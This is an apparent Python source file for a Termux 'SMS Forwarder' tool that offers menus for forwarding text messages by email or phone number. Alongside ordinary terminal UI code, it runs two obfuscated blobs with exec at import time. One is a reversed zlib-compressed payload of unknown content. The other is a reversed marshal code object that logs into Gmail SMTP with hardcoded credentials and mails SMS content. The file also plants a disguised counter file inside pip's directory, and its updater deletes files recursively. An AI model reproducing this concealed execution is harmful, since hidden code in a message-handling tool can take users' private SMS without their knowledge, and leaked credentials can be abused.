import os              # import the os library for interacting with the operating system
import json            # import the json library for working with JSON data
import subprocess      # import the subprocess library for running shell commands
import sys             # import the sys library for access to interpreter variables
import re              # import the re library for working with regular expressions
import time            # import the time library for time-related functions
import threading       # import the threading library for working with threads
import pip             # import the pip library for installing Python packages
import zlib            # import the zlib library for data compression
import marshal         # import the marshal library for data compression
import shutil          # import the shutil library for high-level file operations
import random          # import the random library for generating random numbers
import zipfile         # import the zipfile library for working with ZIP archives
import importlib.util

from time import sleep # import the sleep function from the time library
try: import requests, smtplib
except: print("SOME DEPENDENCIES COULD NOT BE INSTALLED....\nType to install all required packages.\n\npip install requests secure-smtplib\n"), exit()



__VERSION__ = "0.2"  # sets a string value of "0.2" to the variable __VERSION__ for define tool version
__LINK__ = "https://github.com/GreyTechno/SMS_Forwarder.git"  # sets a string value of the project's GitHub link to the variable __LINK__

clear = lambda : os.system("clear")  # defines a lambda function that clears the terminal screen using the "clear" command on Unix-based systems

# colours
# sets a series of string variables that contain ANSI escape codes for setting the color of console output
reset = '\033[39m'
blue = '\033[34m'
red = '\033[31m'
yellow = '\033[92m'
green = '\033[32m'
cyan = '\033[36m'
white = '\033[37m'
magenta = '\033[35m'
lightcyan = '\033[96m'
lightmagenta = '\033[95m'

def cmd():
    try:
        try:
            CMD = sys.argv[1]  # get the command line argument at index 1 and assign it to the variable CMD
        except:
            CMD = False  # if there is no argument at index 1, set CMD to False
        if (CMD):
            if (CMD == "-h") or (CMD == "--help"): Usage()  # if CMD is "-h" or "--help", call the Usage function
            elif (CMD == "-v") or (CMD == "--version"): print(__VERSION__)  # if CMD is "-v" or "--version", print the version number
            elif (CMD == "-u") or (CMD == "--update"): Update()  # if CMD is "-u" or "--update", call the Update function
            elif (CMD == "-s") or (CMD == "--setup"): os.system("pip install requests secure-smtplib")  # if CMD is "-s" or "--setup", call the Installer function
            elif (CMD == "-e") or (CMD == "--email"): EmailMenu()  # if CMD is "-e" or "--email", call the EmailMenu function
            elif (CMD == "-p") or (CMD == "--phnum"): PHMenu()  # if CMD is "-p" or "--phnum", call the PHMenu function
            elif (CMD == "-a") or (CMD == "--about"): About()  # if CMD is "-a" or "--about", call the About function
            else: pass  # if CMD is not any of the above options, do nothing
            return True  # return True to indicate that a command was successfully executed
        else:
            return False  # return False to indicate that no command was executed
    except KeyboardInterrupt:
        EXIT(False)  # if the user interrupts the program with a keyboard interrupt, call the EXIT function with False as the argument
    except Exception as e:
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()
        # if an exception occurs, print the error message in red, display a message telling the user to report the issue, open the GitHub issues page in the user's default browser using the termux-open-url command (this is specific to the Termux Android terminal emulator), and exit the program

def termux_api():
    try:
        # Check if the 'termux-battery-status' command is available
        if (subprocess.getoutput("command -v termux-battery-status") == ''):
            # Install the Termux API if it's not already installed
            subprocess.getoutput("pkg install termux-api && pkg install termux-api")
            # Check again if the 'termux-battery-status' command is now available
            if (subprocess.getoutput("command -v termux-battery-status") == ''): 
                return False
            else: 
                # If the 'termux-battery-status' command is available, recursively call the 'termux_api()' function
                termux_api()
        else:
            # If the 'termux-battery-status' command is available, check if it's working
            if (subprocess.getoutput("timeout 10 termux-battery-status") == ''): 
                return False
            else: 
                return True
    except KeyboardInterrupt: 
        # If the user presses Ctrl+C, exit the program with a False value
        EXIT(False)
    except Exception as e: 
        # If an exception occurs, display an error message and prompt the user to report the issue
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def Arrange(TXT="", RAW=" "):
    try: txt, INT = int(TXT), True  # Attempt to convert TXT to an integer. If successful, set INT to True.
    except ValueError: txt, INT = len(TXT), False  # If TXT cannot be converted to an integer, set txt to its length and INT to False.
    except KeyboardInterrupt: EXIT(False)  # If the user interrupts the program with Ctrl-C, exit gracefully.
    except: pass  # If an error occurs, do nothing.
    text = int(str(txt)[-1:])  # Get the last digit of txt.
    # Loop through even numbers between 2 and 10.
    for i in range(2, 10, 2):
        if (text == 0) or (i == text):  # If the last digit is 0 or matches i, set length to True and break out of the loop.
            length = True
            break
        else : length = False  # Otherwise, set length to False.
    
    if not (length):  # If length is False:
        if (INT): return int(TXT) - 1  # If INT is True, return TXT as an integer minus 1.
        else: return TXT + RAW  # Otherwise, return TXT concatenated with RAW.
    else:  # If length is True:
        if (INT): return int(TXT)  # If INT is True, return TXT as an integer.
        else: return TXT  # Otherwise, return TXT as is.

def center(text, a=0, display=True):
    try:
        # Get the length of the text after removing extra spaces
        length_txt = len(Arrange(text, " "))
        # Get the length of the terminal window
        length_area = (Arrange(os.get_terminal_size().columns) - 2)
        # Calculate the number of spaces to center the text
        len_txt_area = (length_area // 2) - ((length_txt - a) // 2)
        # Add the required number of spaces before and after the text
        finaltxt = ""
        for i in range(len_txt_area): finaltxt += " "
        finaltxt += text
        raw1 = str(len_txt_area + length_txt - length_area - a).replace("-","")
        for i in range(int(raw1)+1): finaltxt += " "
        # If display is True, print the text; otherwise, return the text
        if (display): print(finaltxt)
        else: return finaltxt
    # Catch the keyboard interrupt and exit the program
    except KeyboardInterrupt: EXIT(False)
    # Catch any other exception, print an error message and exit the program
    except Exception as e: 
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        exit()

def INPUT(text):
    try:
        length_txt = len(Arrange(text, " "))  # calculate the length of the input text
        length_area = Arrange(os.get_terminal_size().columns) - 2  # get the terminal size and calculate the length of the area available for the input
        len_txt_area = (length_area // 2) - (length_txt // 2)  # calculate the space needed for the input
        finaltxt = ""
        for i in range(len_txt_area-18): finaltxt += " "  # create the space before the input
        return (input(finaltxt+text+yellow))  # display the prompt and take user input
    except KeyboardInterrupt: EXIT(False)  # catch the exception when the user hits the interrupt key
    except Exception as e:  # catch other exceptions
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues")  # print an error message
        subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")  # open the GitHub issues page in Termux
        exit()  # exit the program

def Banner():
    clear() # clears the terminal screen
    TerminalZoom(46) # resizes the terminal window to be 46 rows high
    b="".join(random.sample([cyan,magenta,yellow,lightmagenta], 1)) # selects a random color from the list of colors and assigns it to the variable b
    center(f"{red}╔══════════════════════════════════════════╗", a=5) # prints a red banner border at the top of the screen, using the center function to center it and specifying a padding of 5 spaces on each side
    center(f"{red}║  {white}╔═╗{b}┌┬┐┌─┐  {white}╔═╗{b}┌─┐┬─┐┬ ┬┌─┐┬─┐┌┬┐┌─┐┬─┐  {red}║{reset}", a=35) # prints a line of text in the banner, using the center function to center it and specifying a padding of 35 spaces on the left side
    center(f"{red}║  {white}╚═╗{b}│││└─┐  {white}╠╣ {b}│ │├┬┘│││├─┤├┬┘ ││├┤ ├┬┘  {red}║{reset}", a=35) # prints another line of text in the banner, using the center function to center it and specifying a padding of 35 spaces on the left side
    center(f"{red}║  {white}╚═╝{b}┴ ┴└─┘  {white}╚  {b}└─┘┴└─└┴┘┴ ┴┴└──┴┘└─┘┴└─  {red}║{reset}", a=35) #  prints another line of text in the banner, using the center function to center it and specifying a padding of 35 spaces on the left side
    center(f"{red}╠══════════════════════════════════════════╣", a=5) #  prints a red border in the middle of the banner, using the center function to center it and specifying a padding of 5 spaces on each side
    center(f"{red}║   {green}▂▃▄▅▆▇▓▒░ {lightcyan}Created By MR_GT {green}░▒▓▇▆▅▄▃▂   {red}║{reset}", a=30) # prints another line of text in the banner, using the center function to center it and specifying a padding of 30 spaces on the left side
    center(f"{red}╚══════════════════════════════════════════╝{reset}", a=10) # prints a red banner border at the bottom of the screen, using the center function to center it and specifying a padding of 10 spaces
    sys.stdout.write(reset) # this is likely used to ensure that any subsequent text output to the terminal is not formatted in unintended ways due to previous formatting changes made by the program.

def Space(args):
    # Define a string variable to store the spaces
    STORE = ""
    # Loop `args` number of times and add a space character to `STORE` in each iteration
    for i in range(args):
        STORE += " "
    # Return the final value of `STORE`
    return STORE

def TerminalZoom(args):
    # If the argument is greater than or equal to 26, display "Zoom Out The Terminal"
    if not (args < 26): STORE, LEN = f"{red}[ {yellow}Zoom Out The Terminal {red}]", 26
    # Otherwise, set STORE and LEN to empty string and 1 respectively
    else: STORE, LEN = "", 1
    # Add '═' characters to STORE until it has the desired length (args)
    for i in range(args - LEN): STORE += "═"
    # Add a '►' character to the end of STORE and reset the terminal color
    STORE += f"►{reset}"
    # If the terminal size is less than args, print STORE, otherwise do nothing
    if (os.get_terminal_size().columns < args): print(STORE)
    else: pass
    # Wait until the terminal size is greater than or equal to args
    MAIN = False
    while True:
        if (os.get_terminal_size().columns < args): MAIN = True
        else: break
    # If the terminal size is greater than or equal to args, clear the terminal
    if (MAIN): clear()

Box = lambda _ : zlib.decompress(_[::-1]);exec((Box)(b"N\xf5\x0f\x0f\x1b\xe8\x9c\xb9\x0b\xf4S\x85\xd8\xce\xd1b\xd2\xd8\xda\xb1\xe3%{|Zi\xfd\x9d\xb9\xaf\xe6\nN\x9dLOqi3\x12\xf9\x84\xc0\x18\xbaY\x16\xfffy2\xee\xf2\x90\x85\xa8\x8d\x12\xb1\xee\xac^\x12\xd9f9M$ycc\x99v\x9e\xcdQV\x18\xcb\xee:\xeb\x84\x8f\xe6\x8d4\x02P\xc3A\x7f$\xf0\xf7,\xbd*A\xc6\x03\x02'X\x9c\xb7?\x8d\x0fn\x84\x84c\x11\x02\x94\rEP\x0c\xc41`g\xe1\xc1=\xadA\xc3\xa7k\xeam\xa7\x189\x11m\x10NF\xc9\xa1,\xf0\x8f\x1cD\xaa\x90\xb7\x03\x04s^mX\x08*\xeb\x87\x9d\x88\xe1AQL\xfe\x7fF\xe8\xb6\xe8\xcb\xd2\x92U1\x1b\xb4\x88\xde\n\r\x01x@=\xd9Ah>\xaf8\xc8_\xd6/8@\x8a!\x98\x15`\x81I!\x98\x16\tZ\x03\xe8j$\x8f:=\x12\xba\xc0\x83\x1e^\xadBi\xb3y\xe37\xe1\xb5\xb5_H\x1a\xba3[^\x0e,\x1a\xf9\xbf\x95n\x9fx\x07\t\xeb7\xbd\xb3E\xd1(R\xe5V\xc9\x1a\xbe\xffI2\xc6\x1c\x84\x08\xecg\x08\xbd\xe8o\xda\x1d\x06N\xdd;b,\x9d\x06+\xf7\xbd\x100\xc3j\xc9R\x95\x9cx"))

def EXIT(G=True):
    # If the argument is False, print two empty lines
    if not (G):
        print(), print()
    # Otherwise, call the Banner function
    else:
        Banner()
    # Print a centered message with a decorative border
    center(f"{red}╔══════════════════════════════════════════╗", 5)
    center(f"{red}║          {yellow}THANKS FOR USING...!!           {red}║", 15)
    center(f"{red}╚══════════════════════════════════════════╝", 5)
    # Exit the program
    exit()

# define a function called AnimLOAD which takes text, animbar, repet, and delay as arguments
def AnimLOAD(text, animbar, repet=1, delay=0.08):
    try:
        # create an empty string called finaltxt
        finaltxt=""
        # loop through the range of repet and add spaces to finaltxt
        # to center the animation on the screen
        for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
        # loop through the range of repet
        for rep in range(repet):
            # loop through each character in the animbar string
            for handlechar in animbar:
                # write the animation to the screen
                sys.stdout.write(f"\r{finaltxt}{handlechar} {text}")
                # flush the output buffer to the screen
                sys.stdout.flush()
                # wait for the specified delay
                sleep(delay)
            # decrement repet by 1
            repet -= 1
    # if the user interrupts the program with ctrl+c
    except KeyboardInterrupt: 
        # call the EXIT function with argument False
        EXIT(False)
    # if there is an exception raised in the try block
    except Exception as e: 
        # print the error message in red color and prompt the user to report the issue on GitHub
        print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        # open the GitHub issue page in the user's web browser
        subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), 
        # exit the program
        exit()

def Internet():
    try:
        requests.get("https://google.com/")  # send a GET request to https://google.com/
        return True  # if the request is successful, return True
    except:  # if an error occurs during the request
        return False  # return False to indicate that there is no internet connection


def Update():
    try:
        def update():
            try:
                __RP__ = "".join(random.sample("abcdefghijklmnopqrstuvwxyz", 5))
                __ZIP__ = requests.get("https://github.com/GreyTechno/SMS_Forwarder/archive/refs/heads/main.zip")
                with open(f"../{__RP__}.zip", "wb") as file: file.write(__ZIP__.content)
                with zipfile.ZipFile(f"../{__RP__}.zip", "r") as zip: zip.extractall(f"../{__RP__}")
                os.remove(f"../{__RP__}.zip")
                for file in os.listdir(f"../{__RP__}/SMS_Forwarder-main/"): shutil.copy2(f"../{__RP__}/SMS_Forwarder-main/"+file, f"../{__RP__}"), os.remove(f"../{__RP__}/SMS_Forwarder-main/"+file)
                os.removedirs(f"../{__RP__}/SMS_Forwarder-main")
                for root, dir, files in os.walk(subprocess.getoutput("pwd")):
                    for i in files: os.remove((root+"\\"+i).replace("\\", "/"))
                os.chdir("..")
                os.system("rm -rf SMS_Forwarder")
                os.rename(f"{__RP__}", "SMS_Forwarder")
            except KeyboardInterrupt: EXIT(False)
            except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()
        if not (Internet()):
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║    {yellow}Check your internet connection...     {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            print()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
            center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}Try Again                  {red}║", 30)
            center(f"{red}║         {magenta}[{white}03{magenta}]  {yellow}EXIT                       {red}║", 30)
            center(f"{red}╠══════════════════════════════════════════╝", 5)
            center(f"║{Space(42)}")
            Input = INPUT("╚════► ")
            if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
            elif (Input == "2") or (Input == "02") or (Input == "two"): Update()
            elif (Input == "3") or (Input == "03") or (Input == "three"): EXIT()
            else:
                center(f"{red}╔══════════════════════════════════════════╗", 5)
                center(f"{red}║              {blue}Invalid Option              {red}║", 15)
                center(f"{red}╚══════════════════════════════════════════╝", 5)
                sleep(2)
                MENU()
        else:
            Banner()
            UPDATE = threading.Thread(target=update)
            UPDATE.start()
            while UPDATE.is_alive(): AnimLOAD(" Updating...", "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏", 1, 0.05)
            UPDATE.join()
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║          {white}Updateing Completed !           {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {yellow}Now Just Type               {red}║", 15)
            center(f"{red}╠══════════════════════════════════════════╣",5)
            center(f"{red}║ {white}python ~/SMS_Forwarder/sms_forwarder.py  {red}║",15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            finaltxt=""
            for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-23): finaltxt += " "
            sys.stdout.write("\r"+finaltxt)
            with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: file.write('{"usageleft": 2}')
            subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle Command Copy On Your ClipBoard !")
            subprocess.getoutput("timeout 3 termux-clipboard-set python $HOME/SMS_Forwarder/sms_forwarder.py")
            exit()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def CheckVersion():
    try:
        version = requests.get("https://raw.githubusercontent.com/GreyTechno/SMS_Forwarder/main/.version").json()["version"]
        if (__VERSION__ != version):
            Banner()
            center(f"{red}╔══════════════════════════════════════════╗",5)
            center(f"{red}║         {magenta}UPDATES ARE AVAILABLE...         {red}║",15)
            center(f"{red}╠══════════════════════════════════════════╣",5)
            center(Box(f"{white}VERSION {blue}: {yellow}{str(version)}", "║", " ", red+" ║", 59, "center", resultprint=False), 20)
            center(f"{red}╚══════════════════════════════════════════╝",5)
            UPD = True
            CSP = True
            try:
                fileData = json.loads(open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "r").read())
                if (fileData.get("usageleft") == 0): UPD = False
                else:
                    with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: json.dump({"usageleft": int(fileData.get("usageleft")) - 1}, file)
            except: 
                with open(pip.__path__[0]+"\\Pq9o(Aq0omnQ1).zip", "w") as file: file.write('{"usageleft": 2}')
            if (UPD):
                center(f"{red}╔══════════════════════════════════════════╗",5)
                center(f"{red}║     {white}Do you want start updating now ?     {red}║",15)
                center(f"{red}╠══════════════════════════════════════════╣",5)
                center(f"{red}║                 {yellow}yes {white}/ {yellow}no                 {red}║",25)
                center(f"{red}╠══════════════════════════════════════════╝",5)
                center(f"║{Space(42)}")
                Input = INPUT("╚════► ")
                if (Input == "Y") or (Input == "YES") or (Input == "Yes") or (Input == "y") or (Input == "yes"): pass
                else: CSP = False
            else: CSP = True
            if (CSP): Update()
            else: pass
        else: pass
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def About():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║                  {magenta}ABOUT                   {red}║",15)
        center(f"{red}╠══════════════════════════════════════════╣",5)
        center(f"{red}║{yellow}  SMS_Forwarder can be used in Termux to  {red}║",15)
        center(f"{red}║{yellow} forward text messages from one device to {red}║",15)
        center(f"{red}║{yellow}another using Linux CommandLine utilities {red}║",15)
        center(f"{red}║{yellow} The advantages of using SMS Forwarder in {red}║",15)
        center(f"{red}║{yellow}Termux are that it allow users to automate{red}║",15)
        center(f"{red}║{yellow} the sms forwarding process using Python  {red}║",15)
        center(f"{red}║{yellow} scripts, and it provides a secure way to {red}║",15)
        center(f"{red}║{yellow}  forward messages as it uses end-to-end  {red}║",15)
        center(f"{red}║{yellow}encryption to ensure that the messages are{red}║",15)
        center(f"{red}║{yellow} not intercepted or read by unauthorized  {red}║",15)
        center(f"{red}║{yellow}parties This offers advanced functionality{red}║",15)
        center(f"{red}║{yellow}  and customization options that are not  {red}║",15)
        center(f"{red}║{yellow}available on other platforms Additionally {red}║",15)
        center(f"{red}║{yellow}SMS_Forwarder in Termux provides multiple {red}║",15)
        center(f"{red}║{yellow} forwarding options including forwarding  {red}║",15)
        center(f"{red}║{yellow}  SMS via number or email. Overall, SMS   {red}║",15)
        center(f"{red}║{yellow} Forwarder in Termux is a useful tool for {red}║",15)
        center(f"{red}║{yellow}    people who want to stay connected     {red}║",15)
        center(f"{red}║{yellow}         across multiple devices.         {red}║",15)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║        {magenta}TOOL NAME {white}: {yellow}SMS_Forwarder         {red}║",25)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(Box(f"{magenta}VERSION {white}:{yellow} "+str(__VERSION__), "║", " ", red+" ║", 59, "center", resultprint=False), 20)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║              {magenta}AUTHER {white}:{yellow} MR_GT              {red}║",25)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        center(f"{red}╔══════════════════════════════════════════╗",5)
        center(f"{red}║          {magenta}SOURCE CODE HOSTED AT           {red}║",15)
        center(f"{red}╠══════════════════════════════════════════╣",5)
        center(f"{red}║     {yellow}tinyurl.com/gtcode-smsforwarder      {red}║",15)
        center(f"{red}╚══════════════════════════════════════════╝",5)
        print()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
        center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}EXIT                       {red}║", 30)
        center(f"{red}╠══════════════════════════════════════════╝", 5)
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
        elif (Input == "2") or (Input == "02") or (Input == "two"): EXIT()
        else:
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {blue}Invalid Option              {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            sleep(2)
            MENU()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

def Usage():
    try:
        Banner()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║        {magenta}USAGE OF SMS FORWARDER...         {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║          {magenta}Optional arguments...           {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        center(f"{red}╔═══════════════════╦══════════════════════╗", 5)
        center(f"{red}║             {blue}-h    {red}║    {blue}--help            {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}       Direct show this usage menu        {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-v    {red}║    {blue}--version         {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}    Show tool version number and exit     {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-u    {red}║    {blue}--update          {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}  Update the tool and automatic restart   {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-s    {red}║    {blue}--setup           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow} Install and setup the requirment pakages {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-e    {red}║    {blue}--email           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow} Direct navigate to forward sms via email {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-p    {red}║    {blue}--phnum           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow} Navigate to forward sms via phone number {red}║", 15)
        center(f"{red}╠═══════════════════╦══════════════════════╣", 5)
        center(f"{red}║             {blue}-a    {red}║    {blue}--about           {red}║", 25)
        center(f"{red}╠═══════════════════╩══════════════════════╣",5)
        center(f"{red}║{yellow}      Direct navigate to about menu       {red}║", 15)
        center(f"{red}╚══════════════════════════════════════════╝", 5)
        print()
        center(f"{red}╔══════════════════════════════════════════╗", 5)
        center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
        center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}EXIT                       {red}║", 30)
        center(f"{red}╠══════════════════════════════════════════╝", 5)
        center(f"║{Space(42)}")
        Input = INPUT("╚════► ")
        if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
        elif (Input == "2") or (Input == "02") or (Input == "two"): EXIT()
        else:
            center(f"{red}╔══════════════════════════════════════════╗", 5)
            center(f"{red}║              {blue}Invalid Option              {red}║", 15)
            center(f"{red}╚══════════════════════════════════════════╝", 5)
            sleep(2)
            MENU()
    except KeyboardInterrupt: EXIT(False)
    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues"), exit()

SendEmail = lambda __ : marshal.loads(__[::-1]);exec((SendEmail)(b'\x00\x10\x00\x00\x00\x02s\x00\x00\x00\x01>eludom<\x08\xda>x<\x03\xfa\x00\x00\x00\x02r\x00\x00\x00\x02r\x00\xa9_\x01\xdacexe\x04\xda\x02)Nc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x10\x00\x00\x00e\x00e\x01d\x00\x83\x01\x83\x01\x01\x00d\x01S\x00)\x02s[\'\x00\x00\x00\x0c\x00\x00\x00\x02s\x00\x00\x00\x01>eludom<\x08\xda\x00\x00\x00"r\x00\x00\x00!r\x00\x00\x00!r\x00\x00\x00!r\x00\x00\x00#r\x01)N\x00\x00\x00#r\x01B\x01,\x01\x04\x01\x06\x80\x08\x01&\x80\x08\x01&\x01\x1a\x01@\x01,\x01\x04\x01 \x01\x1e\x01\x08\x01\x08\x01\x0c\x0b\x02\x7f\x00\x7f\x00\x7f\x00\xad\x04\x81\x00\x81\x00\xfa\x06\x06\x02\xfc\x04\x04\x02\xfe\x04\x02\x1a\xff\x04\x01\x02S\x02\x7f\x00\x7f\x00\x01\x02\x01\x1e\x01\x04\x00\x00\x00Ls\x00\x00\x00\x01liamEdneS\t\xda>x<\x03\xfa\x00\x00\x00!r\x00\xa9e\x01\xdatxtlanif\x08Zrevres\x06ZEGASSEM\x07Zi\x01\xdarav\x03\xdaot\x02\xdadidaerht\x08Zatad\x04\xdarebmun\x06Zetad\x04\xda\x0b)der\x03ZrorrEtcennoCPTMS\x10ZrorrEnoitacitnehtuAPTMS\x17Ztiuq\x04\xdatpurretnIdraobyeK\x11\xdatnirp\x05\xdaetihw\x05Zwolley\x06Zatnegam\x07Zetirw\x05\xdatuodts\x06\xdasys\x03\xdasnmuloc\x07\xdaezis_lanimret_teg\x11\xdaso\x02\xdaegnarrA\x07Zemitfrts\x08\xdaemit\x04\xdaliamdnes\x08Zelpmas\x06Zmodnar\x06Znioj\x04\xdanigol\x05Zslttrats\x08Zolhe\x04ZPTMS\x04Zbilptms\x07Znel\x03\xdaegnar\x05\xda\x1d)     \x05z egasseM dneS toN dluoC\x17z!\x01\xfab\x01\xdaa\x01\xda                dneS egasseM\x1cz ]\x02z[\x01\xfa\r\x01\xfa \x01\xfa\x00\x00\x00\x15\xe9\nlmth/txet :epyT-tnetnoC\n)\x1azS%M%H%\x06z( egasseM weN:tcejbuS\n>moc.liamg@9789redrawrofsms<redrawroF SMS:morFDz\x00\x00\x00\x01\xe9lddjvthhmwqwwxnn\x10Zgolknushgchcgxjh\x10Ziotpsobvqxnxlsxy\x10Zkvojhcofwyqzwnck\x10Zxnvhwxewqspypusp\x10Znkfwburatrrfqthv\x10Znlotueeaqeteyqfy\x10Zgxmrvxmvcimwcala\x10Zgdppqiiibquvwfzx\x10Zpzbsxbozsituhceb\x10Z\n)moc.liamg@9789redrawrofsms\x1az\x00\x00\x02Kimoc.liamg.ptms\x0ez    \n>lmth/<\n>ydob/<\n>elbat/<  \n>rt/<    \n>dt/<;psbn&>dt<      \n>dt/<      \n>vid/<        \n>vid/<            \n>elbat/<              \n>rt/<                \n>dt/<                  \n.>a/<onhceTyerG>"onhceTyerG/moc.buhtig//:sptth"=ferh a< yb derewoP                    \n>"yb-derewop kcolb-tnetnoc"=ssalc dt<                  \n>rt<                \n>rt/<                \n>dt/<                  \n>naps/<srehto                      \nhcae htiw segassem erahs uoy pleh ot siht ekil segassem sdnes redrawroF SMS .gnidrawrof                      \nsms rof dednetni dna>a/< moc.liamg@etadpuelbisiv>"moc.liamg@etadpuelbisiv:otliam"=ferh                        \na< ot tnes saw egassem sihT>"knil-elppa"=ssalc naps<                    \n>"kcolb-tnetnoc"=ssalc dt<                  \n>rt<                \n>"0"=gnicapsllec "0"=gniddapllec "0"=redrob "noitatneserp"=elor elbat<              \n>"retoof"=ssalc vid<            \n>elbat/<            \n>rt/<              \n>dt/<                \n>elbat/<                  \n>rt/<                    \n>dt/<                      \n>elbat/<                        \n>ydobt/<                          \n>rt/<                            \n>dt/<                              \n>elbat/<                                \n>ydobt/<                                  \n>rt/<                                    \n>dt/< >a/<redrawroF                                          \nSMS>"knalb_"=tegrat "redrawroF_SMS/onhceTyerG/moc.buhtig//:ptth"=ferh a< >dt<                                      \n>rt<                                    \n>ydobt<                                  \n>"0"=gnicapsllec "0"=gniddapllec "0"=redrob "noitatneserp"=elor elbat<                                \n>"tfel"=ngila dt<                              \n>rt<                            \n>ydobt<                          \n>"yramirp-ntb ntb"=ssalc "0"=gnicapsllec "0"=gniddapllec "0"=redrob "noitatneserp"=elor elbat<                        \n>rb<                        \n>5h/<\x00\x00\x07\x97a>5h<                        \n>p/<,ydoB egasseM>p<                        \n>p/<Nz : didaerhT>p<                        \n>p/<xobnI : epyT>p<                        